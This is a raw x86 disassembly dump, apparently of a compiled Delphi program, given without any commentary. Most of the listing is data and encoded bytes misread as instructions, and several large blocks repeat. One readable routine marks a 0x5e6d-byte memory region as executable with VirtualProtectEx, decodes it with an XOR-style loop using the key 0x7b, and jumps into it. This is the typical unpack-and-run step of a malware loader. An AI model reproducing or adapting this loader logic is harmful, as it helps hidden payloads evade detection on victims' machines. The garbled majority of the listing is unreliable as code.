call 0xfffffffff047acca
mov cl 0x45
add al dh
sahf
inc esp
add [ eax - 0x49 ] ah
inc ebp
add [ edx + ebp * 4 + 0x41 ] ah
add [ eax - 0x13ffba4d ] dh
mov bl 0x45
add al bh
mov ah 0x45
add [ eax - 0x4fffbbd7 ] ah
push cs
inc edx
add [ eax - 0x43 ] dh
inc ebp
add [ ebx + ecx + 0x42 ] bh
add [ eax ] dl
stc
inc ebp
add [ eax - 0x52 ] cl
inc ebp
add [ edx + ebx * 4 ] al
inc esp
add [ eax ] ah
lahf
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add ah bh
push ds
inc esp
add [ eax + 0x50004494 ] al
mov edx 0x91800045
inc esp
add [ esi + ebx + 0x44 ] al
add [ eax + 0x1e ] cl
inc esp
add [ ebx + edi * 4 + 0x45 ] al
add [ eax + 0x4e ] dh
inc esp
add [ eax - 0x3fffbbd7 ] cl
pop ds
inc esp
add [ ebx + ebp ] dl
inc esp
add [ eax ] bh
mov ebp 0xbc040045
inc ebp
add [ esp + ebp + 0x44 ] cl
inc eax
add dl dh
imul eax [ edi ] 0xffffff89
retn
add [ eax - 0xbffba43 ] dh
dec esi
inc esp
add [ edx + edx * 4 ] cl
inc esp
add al cl
xchg edx eax
inc esp
add [ ebp + ecx * 4 - 0x6d53ffbc ] cl
inc esp
add [ eax - 0x53 ] cl
inc ebp
add [ esp + eax * 8 + 0x45 ] dl
add [ eax + 0x68 ] al
inc esp
add [ eax ] bl
rol [ ebp ] 0x1
js r-xdata
inc esp
inc ebp
add [ ebx + edx * 8 ] dh
inc ebp
add al bl
push 0x68dc0044
inc esp
add [ eax + 0x3c0045d5 ] dh
inc esp
add ah ch
xchg ebx eax
inc esp
add [ esp + ebx * 8 - 0x5a3fffbb ] ah
inc esp
add [ eax ] dh
nop
inc esp
add [ eax + 0x3c0045f1 ] bh
cmpsd [ esi ] [ edi ]
inc ebp
add ah ch
test eax 0xe2980045
inc ebp
add ah dl
mov dl 0x45
add [ eax - 0x4d ] dl
inc ebp
add [ eax + 0xc0045f5 ] bl
mov al 0x45
add [ eax + esi * 8 - 0x2883ffbb ] bl
inc ebp
add [ eax - 0xe ] dl
inc ebp
add [ edi * 4 + 0x110045 ] dh
leave
outsb
inc edi
add al bh
add al [ eax ]
add [ eax ] al
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x2fc31
add [ ecx ] al
add [ esi ] al
push eax
popad
outsb
insb
xor [ eax ] eax
add eax [ eax ]
add [ edx ] al
add [ ecx ] cl
inc edi
jb r-xdata
je r-xdata
jne r-xdata
dec ecx
outsd
js r-xdata
inc edx
outsd
js r-xdata
inc edx
add al bh
inc esp
push 0x74746f72
insb
xor [ gs : eax ] esi
jb r-xdata
dec edi
dec eax
popad
outsb
insb
jb r-xdata
and [ ebx ] al
add [ eax ] al
or al [ eax ]
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + eax ] esp
add [ esi ] al
add [ ecx ] cl
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x31756e65
adc al 0x3
add [ eax ] al
pop es
add [ edx ] cl
push eax
outsd
jo r-xdata
add al 0x3
add [ eax ] al
add eax [ eax ]
or al 0x52
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
pop es
inc edx
jne r-xdata
xor [ esp + ebp * 2 - 0x7b03ffb9 ] ebx
inc ebp
add [ esi ] bl
add eax 0x74696e55
push es
push esp
inc esi
outsd
jb sub_476f80
fild [ edx ]
fsub [ ebx + 0x47 ]
add [ eax + 0xb ] cl
inc ebx
add [ eax + r-xdata ] dl
pop es
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc ebx
add [ eax + 0x72 ] bh
inc ebx
jne r-xdata
add eax [ eax ]
add [ eax + eax ] cl
or eax [ esi + 0x69 ]
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x3431676f
xor [ eax ] esi
jo r-xdata
xor ch [ eax ]
add eax [ eax ]
add [ edx ] cl
add [ ebx ] cl
push edx
popad
je r-xdata
xor [ ecx ] al
retn
call sub_403174
inc ebp
add [ esp + ebx ] dh
inc ebp
add [ ebx + ebp * 2 ] ah
inc ebx
add [ ebp + edi * 2 + 0x43 ] dh
add [ ebp + edi * 8 + 0x42 ] bl
add [ ecx + ecx * 2 - 0x20d3ffb9 ] cl
inc edx
add ah bl
arpl [ edi ] ax
dec eax
or eax [ ebx ]
nop
or al 0x6f
inc edi
add [ edi ] al
dec ebp
inc ebx
add [ eax + 0x19 ] dl
cmp [ ebx ] al
add [ eax ] al
push cs
add [ esp + ecx * 2 ] cl
popad
bound esp [ ebp + 0x6c ]
inc ebp
imul esi [ fs : ecx + esi + 0x6 ] 0x726f4654
insd
jb r-xdata
xor ebp [ ebx + eax ]
add [ eax ] al
or eax [ eax ]
adc al 0x49
dec ecx
imul ebp [ fs : edi + 0x47 ] 0x70756f72
or edx [ edx + 0x61 ]
outsb
jne r-xdata
outsd
jne r-xdata
outsb
xor [ ebx + eax ] ecx
add [ eax ] al
add eax 0x614c0600
bound esp [ ebp + 0x6c ]
xor [ eax ] edx
add eax [ eax ]
xor [ eax ] eax
add [ ebx - 0x35fc6f40 ] cl
jae r-xdata
add [ 0x74696e55 ] al
add [ edx + 0x43 ] ah
add [ ebp + ecx * 2 + 0x19500043 ] dh
add [ eax ] al
or al [ eax ]
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
and al 0x3
sbb [ ebx ] al
add [ eax ] al
or [ eax ] al
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
jb r-xdata
jo r-xdata
sbb al 0x3
add [ eax ] al
or [ eax ] eax
or [ ecx + ebp * 2 + 0x73 ] cl
lea eax [ eax ]
xor [ edi ] ecx
add [ eax ] cl
out 0x44 eax
add al cl
add eax [ eax ]
add [ 0x64491200 ] cl
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ ebx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x6c616944
outsd
xor [ si ] esi
sub [ ebx ] al
add [ eax ] al
or al [ eax ]
sub_476bf4
mov eax [ ebp - 0x4 ]
add eax 0x44
mov edx [ ebx + 0x4 ]
call sub_40405c
call sub_403a3c
mov eax [ ebp - 0x4 ]
call sub_420668
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476c18
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403988
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476c44
retn
sub_476c54
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x6f
inc edi
add [ eax + 0x476d ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
outsb
inc edi
add [ ebx + eax ] bh
add [ eax ] al
mov ah 0x83
inc ebp
add [ eax - 0x2bffbdf2 ] bl
scasd [ edi ]
inc ebp
add [ eax - 0x6fffba4f ] cl
xor al 0x40
add ah dh
aad 0x45
add ah cl
xor [ eax ] eax
call 0xfffffffff047acca
mov cl 0x45
add al dh
sahf
inc esp
add [ eax - 0x49 ] ah
inc ebp
add [ edx + ebp * 4 + 0x41 ] ah
add [ eax - 0x13ffba4d ] dh
mov bl 0x45
add al bh
mov ah 0x45
add [ eax - 0x4fffbbd7 ] ah
push cs
inc edx
add [ eax - 0x43 ] dh
inc ebp
add [ ebx + ecx + 0x42 ] bh
add [ eax ] dl
stc
inc ebp
add [ eax - 0x52 ] cl
inc ebp
add [ edx + ebx * 4 ] al
inc esp
add [ eax ] ah
lahf
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add ah bh
push ds
inc esp
add [ eax + 0x50004494 ] al
mov edx 0x91800045
inc esp
add [ esi + ebx + 0x44 ] al
add [ eax + 0x1e ] cl
inc esp
add [ ebx + edi * 4 + 0x45 ] al
add [ eax + 0x4e ] dh
inc esp
add [ eax - 0x3fffbbd7 ] cl
pop ds
inc esp
add [ ebx + ebp ] dl
inc esp
add [ eax ] bh
mov ebp 0xbc040045
inc ebp
add [ esp + ebp + 0x44 ] cl
add [ eax - 0xbffba43 ] dh
dec esi
inc esp
add [ edx + edx * 4 ] cl
inc esp
add al cl
xchg edx eax
inc esp
add [ ebp + ecx * 4 - 0x6d53ffbc ] cl
inc esp
add [ eax - 0x53 ] cl
inc ebp
add [ esp + eax * 8 + 0x45 ] dl
add [ eax + 0x68 ] al
inc esp
add [ eax ] bl
rol [ ebp ] 0x1
js r-xdata
inc esp
inc ebp
add [ ebx + edx * 8 ] dh
inc ebp
add al bl
push 0x68dc0044
inc esp
add [ eax + 0x3c0045d5 ] dh
inc esp
add ah ch
xchg ebx eax
inc esp
add [ esp + ebx * 8 - 0x5a3fffbb ] ah
inc esp
add [ eax ] dh
nop
inc esp
add [ eax + 0x3c0045f1 ] bh
cmpsd [ esi ] [ edi ]
inc ebp
add ah ch
test eax 0xe2980045
inc ebp
add ah dl
mov dl 0x45
add [ eax - 0x4d ] dl
inc ebp
add [ eax + 0xc0045f5 ] bl
mov al 0x45
add [ eax + esi * 8 - 0x2883ffbb ] bl
inc ebp
add [ eax - 0xe ] dl
inc ebp
add [ edi * 4 + 0x110045 ] dh
leave
outsb
inc edi
add al bh
add al [ eax ]
add [ eax ] al
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x2fc31
add [ ecx ] al
add [ esi ] al
push eax
popad
outsb
insb
xor [ eax ] eax
add eax [ eax ]
add [ edx ] al
add [ ecx ] cl
inc edi
jb r-xdata
je r-xdata
jne r-xdata
dec ecx
outsd
js r-xdata
inc edx
outsd
js r-xdata
inc edx
add al bh
inc esp
push 0x74746f72
insb
xor [ gs : eax ] esi
jb r-xdata
dec edi
dec eax
popad
outsb
insb
jb r-xdata
and [ ebx ] al
add [ eax ] al
or al [ eax ]
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + eax ] esp
add [ esi ] al
add [ ecx ] cl
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x31756e65
adc al 0x3
add [ eax ] al
pop es
add [ edx ] cl
push eax
outsd
jo r-xdata
add al 0x3
add [ eax ] al
add eax [ eax ]
or al 0x52
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
pop es
inc edx
jne r-xdata
xor [ esp + ebp * 2 - 0x7b03ffb9 ] ebx
inc ebp
add [ esi ] bl
add eax 0x74696e55
push es
push esp
inc esi
outsd
jb sub_476f80
fild [ edx ]
fsub [ ebx + 0x47 ]
add [ eax + 0xb ] cl
inc ebx
add [ eax + r-xdata ] dl
pop es
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc ebx
add [ eax + 0x72 ] bh
inc ebx
jne r-xdata
add eax [ eax ]
add [ eax + eax ] cl
or eax [ esi + 0x69 ]
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x3431676f
xor [ eax ] esi
jo r-xdata
xor ch [ eax ]
add eax [ eax ]
add [ edx ] cl
add [ ebx ] cl
push edx
popad
je r-xdata
xor [ ecx ] al
retn
call sub_403174
inc ebp
add [ esp + ebx ] dh
inc ebp
add [ ebx + ebp * 2 ] ah
inc ebx
add [ ebp + edi * 2 + 0x43 ] dh
add [ ebp + edi * 8 + 0x42 ] bl
add [ ecx + ecx * 2 - 0x20d3ffb9 ] cl
inc edx
add ah bl
arpl [ edi ] ax
dec eax
or eax [ ebx ]
nop
or al 0x6f
inc edi
add [ edi ] al
dec ebp
inc ebx
add [ eax + 0x19 ] dl
cmp [ ebx ] al
add [ eax ] al
push cs
add [ esp + ecx * 2 ] cl
popad
bound esp [ ebp + 0x6c ]
inc ebp
imul esi [ fs : ecx + esi + 0x6 ] 0x726f4654
insd
jb r-xdata
xor ebp [ ebx + eax ]
add [ eax ] al
or eax [ eax ]
adc al 0x49
dec ecx
imul ebp [ fs : edi + 0x47 ] 0x70756f72
or edx [ edx + 0x61 ]
outsb
jne r-xdata
outsd
jne r-xdata
outsb
xor [ ebx + eax ] ecx
add [ eax ] al
add eax 0x614c0600
bound esp [ ebp + 0x6c ]
xor [ eax ] edx
add eax [ eax ]
xor [ eax ] eax
add [ ebx - 0x35fc6f40 ] cl
jae r-xdata
add [ 0x74696e55 ] al
add [ edx + 0x43 ] ah
add [ ebp + ecx * 2 + 0x19500043 ] dh
add [ eax ] al
or al [ eax ]
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
and al 0x3
sbb [ ebx ] al
add [ eax ] al
or [ eax ] al
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
jb r-xdata
jo r-xdata
sbb al 0x3
add [ eax ] al
or [ eax ] eax
or [ ecx + ebp * 2 + 0x73 ] cl
lea eax [ eax ]
xor [ edi ] ecx
add [ eax ] cl
out 0x44 eax
add al cl
add eax [ eax ]
add [ 0x64491200 ] cl
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ ebx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x6c616944
outsd
xor [ si ] esi
sub [ ebx ] al
add [ eax ] al
or al [ eax ]
sub_476f38
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
nop
push esp
push 0x40
push 0x5e6d
push esi
push 0xffffffff
call ecx
push 0x0
push 0x0
call GetClassLongA
test ebx ebx
jb r-xdata
pop edx
pop esi
pop ebx
retn
inc ebx
mov [ esp ] 0x0
nop
nop
mov eax [ esp ]
nop
mov ecx esi
mov edx eax
mov al 0x7b
call sub_476f28
nop
inc [ esp ]
dec ebx
jne r-xdata
sub_476f80
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
nop
nop
test ebx ebx
je r-xdata
push r-xdata
call sub_476f80
nop
mov ecx VirtualProtectEx
mov edx 0x5e6d
mov eax ebx
call sub_476f38
add ebx 0xa59
jae r-xdata
mov [ ebp - 0x4 ] ebx
nop
nop
jmp [ ebp - 0x4 ]
call sub_403174
sub_477033
popad
inc ebx
jpo r-xdata
sbb eax 0x23653ef2
adc [ ebp + 0x25 ] edx
adc [ esi ] ebx
xchg edx eax
adc edi [ ebx + 0x28cb019e ]
in eax 0xb7
jpo r-xdata
jpo r-xdata
jpo r-xdata
jle r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
push ebp
jpo r-xdata
jmp r-xdata
and [ ecx ] edx
or eax 0x921c1122
in al 0x51
jpo r-xdata
xchg edi eax
sbb ebp [ eax ]
sub eax 0x84851b92
test bl ch
xchg edx eax
iretd
jmp r-xdata
jmp r-xdata
fstp [ edx ]
jpo r-xdata
jmp r-xdata
adc edx [ ecx - 0x6d3e6e06 ]
jl r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xchg ecx eax
dec esp
jpo r-xdata
jmp r-xdata
je r-xdata
jmp r-xdata
adc [ ecx ] edx
adc [ esi ] ecx
jpo r-xdata
mov dl [ edx + 0x7b7b46d1 ]
jmp r-xdata
xchg edx eax
movsb [ edi ] [ esi ]
ja r-xdata
jle r-xdata
mov bh 0x7b
jpo r-xdata
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
cmp esi 0xffffff84
je r-xdata
mov [ 0xffffffffd1928a78 ] al
inc esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov [ edx + 0x7b7b3c1c ] edx
jpo r-xdata
jmp r-xdata
jpo r-xdata
inc edx
xchg ebx eax
jmp r-xdata
jmp r-xdata
jpo r-xdata
[ ecx ]
sbb [ ebx + 0x7b ] ebp
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
jmp r-xdata
jmp r-xdata
into
xchg edx eax
jmp r-xdata
and eax 0xebebebb8
jmp r-xdata
mov ebx 0x7b55ce92
jpo r-xdata
xchg ebx eax
out 0x7b al
jpo r-xdata
jpo r-xdata
aaa
jpo r-xdata
cmp bh [ ebx + 0x7b ]
jmp r-xdata
int1
sub al 0x92
ja r-xdata
xchg edx eax
pop ecx
jns r-xdata
or [ esi + edi + 0x140814a7 ] edi
jmp r-xdata
jpo r-xdata
xchg edx eax
xor [ ebx + edi * 2 ] 0x7b
or al [ eax ]
add [ ebx + 0x5 ] dh
call sub_403174
pop es
jo r-xdata
jmp r-xdata
jmp r-xdata
xchg ecx eax
popad
jpo r-xdata
xchg edx eax
or ah [ edi + 0x7b ]
jpo r-xdata
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
jmp r-xdata
xor ecx [ 0x7b69c692 ]
jpo r-xdata
mov [ 0x9181236 ] eax
mov esp 0x814a73e
jmp r-xdata
jpo r-xdata
adc al 0x1d
mov esp 0x5b0f9b3e
cmpsd [ esi ] [ edi ]
adc al 0x8
jmp r-xdata
daa
jpo r-xdata
jpo r-xdata
jpo r-xdata
and eax 0x52759333
jmp r-xdata
jpo r-xdata
push es
xchg edi eax
adc [ esp ] ebx
sbb eax 0x929506f2
jpe r-xdata
jmp r-xdata
test bl ch
jmp sub_4772dd
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
jpo r-xdata
xor [ ss : esi + edi + 0x30362d97 ] bh
sub eax 0x8b3ebc1d
jpo r-xdata
jmp r-xdata
imul edi [ ebx + 0x7b ] 0x13
test [ edi + edi * 8 + 0x19 ] dh
jmp r-xdata
movsd [ edi ] [ esi ]
pop ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
test ah ch
fwait
jpo r-xdata
jmp r-xdata
cmp eax 0xddd9134f
sbb dl [ eax + 0x7525922c ]
jpo r-xdata
xchg edx eax
int1
xor eax 0xebeb7b7b
jmp r-xdata
jpo r-xdata
and dl [ edx + 0x7b7b52a9 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
imul esi eax 0x26f21da4
aas
pop eax
jmp r-xdata
jpo r-xdata
inc [ esp + esi * 2 + 0x7b6b19ff ]
xchg edx eax
xchg ebx eax
fwait
sbb eax 0x92893ef2
sbb al 0x3c
jpo r-xdata
xchg edi eax
xchg edx eax
push 0xeb7b7b6f
jmp r-xdata
arpl [ ebx + 0x7b ] di
and ah [ edx ]
xchg edx eax
test eax 0xeb7b7b52
jmp r-xdata
test [ ebx + ebp - 0x646c4210 ] al
xchg ebx eax
sub eax 0xc0927b7b
cmp al 0x7b
jpo r-xdata
jmp r-xdata
and edx [ gs : ecx ]
push ebp
and eax 0x7e921e11
mov [ eax + 0x7b ] ch
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
jpo r-xdata
add [ esp + eax * 4 - 0x6c420fd5 ] 0xffffff9b
push edx
jmp r-xdata
inc esp
cmp edi [ ebx + 0x7b ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg ebx eax
jne r-xdata
jpo r-xdata
mov dl 0xb8
jmp r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
jmp r-xdata
sub edx [ edx + 0x7b7b3480 ]
jmp r-xdata
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
aas
jpo r-xdata
xchg ebx eax
in eax 0x37
jpo r-xdata
jpo r-xdata
xor dl [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
xchg edx eax
mov ebx 0x7b3f2d92
sub eax 0xeb7b7b3f
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
jmp r-xdata
ja r-xdata
idiv [ esi ]
mov ebp [ ebx ]
sub al 0x92
cmp al 0x7b
jpo r-xdata
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
push cs
aas
jpo r-xdata
shr [ ebx + 0x7b ] 0x7b
jg r-xdata
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
pop esi
stosb [ edi ]
outsb
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
jmp r-xdata
jmp r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_477099
push ss
push edi
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test ah ch
fwait
jpo r-xdata
jae r-xdata
test [ ebx + ebp - 0x646c4210 ] al
jpo r-xdata
jmp r-xdata
jpo r-xdata
arpl [ ebx + 0x7b ] di
and ah [ edx ]
xchg edx eax
test eax 0xeb7b7b52
jmp r-xdata
add [ esp + eax * 4 - 0x6c420fd5 ] 0xffffff9b
and edx [ gs : ecx ]
push ebp
and eax 0x7e921e11
mov [ eax + 0x7b ] ch
jpo r-xdata
sub esi eax
mov ebp 0x7b639b93
pop ebp
jpo r-xdata
je r-xdata
push ebp
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov dl 0xb8
jmp r-xdata
and dl [ edx + 0x7b7b52a9 ]
xchg ebx eax
fwait
sbb eax 0x92893ef2
sbb al 0x3c
jpo r-xdata
jpo r-xdata
jg r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
mov ebx 0x7b3f2d92
sub eax 0xeb7b7b3f
iretd
push edx
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov edi 0x98922d77
jb r-xdata
pop es
pop edi
dec ebx
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg ebx eax
mov eax 0xf87b7b22
xchg edi eax
adc [ esp ] ebx
sbb eax 0x929506f2
jpo r-xdata
jle r-xdata
mov dl [ edx + 0x7b7b46d1 ]
jmp r-xdata
xor dl [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
xchg edx eax
into
xchg edi eax
sbb ebp [ eax ]
sub eax 0x84851b92
test bl ch
xchg edx eax
jmp r-xdata
je r-xdata
jmp r-xdata
jpo r-xdata
mov [ 0xffffffffd1928a78 ] al
inc esi
jpo r-xdata
jpo r-xdata
jl r-xdata
jmp r-xdata
mov bh 0x7b
jpo r-xdata
mov dh 0x2d
jpo r-xdata
mov ebx 0x7b55ce92
jpo r-xdata
xchg ebx eax
out 0x7b al
jpo r-xdata
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
jmp r-xdata
jmp r-xdata
adc [ ecx ] edx
adc [ esi ] ecx
jpo r-xdata
inc edx
jpo r-xdata
xchg ebx eax
in al 0x51
jpo r-xdata
xchg edx eax
xchg edx eax
push 0x2c
jpo r-xdata
jmp r-xdata
jmp r-xdata
xchg ecx eax
popad
jpo r-xdata
xchg edx eax
or ah [ edi + 0x7b ]
jpo r-xdata
or [ esi + edi + 0x140814a7 ] edi
jmp r-xdata
jpo r-xdata
xchg edx eax
xor [ ebx + edi * 2 ] 0x7b
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
cmp esi 0xffffff84
je r-xdata
jmp r-xdata
adc edx [ ecx - 0x6d3e6e06 ]
xchg ecx eax
dec esp
jpo r-xdata
jmp r-xdata
xchg ebx eax
je r-xdata
and eax 0x52759333
jmp r-xdata
jpo r-xdata
push es
xor ecx [ 0x7b69c692 ]
jpo r-xdata
cmpsd [ esi ] [ edi ]
adc al 0x8
jmp r-xdata
daa
jmp r-xdata
jmp r-xdata
jpo r-xdata
[ ecx ]
sbb [ ebx + 0x7b ] ebp
je r-xdata
push es
xchg ebp eax
jpo r-xdata
jmp r-xdata
cmp eax 0xddd9134f
sbb dl [ eax + 0x7525922c ]
jpo r-xdata
xchg edx eax
int1
xor eax 0xebeb7b7b
jmp r-xdata
imul edi [ ebx + 0x7b ] 0x13
test [ edi + edi * 8 + 0x19 ] dh
jpo r-xdata
aaa
jpo r-xdata
cmp bh [ ebx + 0x7b ]
jmp r-xdata
int1
sub al 0x92
ja r-xdata
xchg edx eax
pop ecx
jns r-xdata
xchg edx eax
movsd [ edi ] [ esi ]
xchg ebx eax
sub eax 0xc0927b7b
cmp al 0x7b
jpo r-xdata
jmp r-xdata
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
jmp r-xdata
adc al 0x1d
mov esp 0x5b0f9b3e
mov [ 0x9181236 ] eax
mov esp 0x814a73e
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
xchg ebx eax
jne r-xdata
jpe r-xdata
jmp r-xdata
test bl ch
jmp sub_4772dd
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
jpo r-xdata
xor [ ss : esi + edi + 0x30362d97 ] bh
sub eax 0x8b3ebc1d
jpo r-xdata
jmp r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
aas
jpo r-xdata
xchg ebx eax
in eax 0x37
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
imul esi eax 0x26f21da4
aas
pop eax
jmp r-xdata
jpo r-xdata
inc [ esp + esi * 2 + 0x7b6b19ff ]
ja r-xdata
idiv [ esi ]
mov ebp [ ebx ]
sub al 0x92
cmp al 0x7b
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
jpo r-xdata
shr [ ebx + 0x7b ] 0x7b
jg r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
jmp r-xdata
sub edx [ edx + 0x7b7b3480 ]
jmp r-xdata
pop esi
stosb [ edi ]
outsb
jpo r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
jmp r-xdata
jmp r-xdata
jmp r-xdata
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
push cs
aas
jpo r-xdata
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_4770b1
mov ecx 0x653ef21d
and edx [ ecx ]
push ebp
and eax 0x7e921e11
inc edx
jpo r-xdata
push ebp
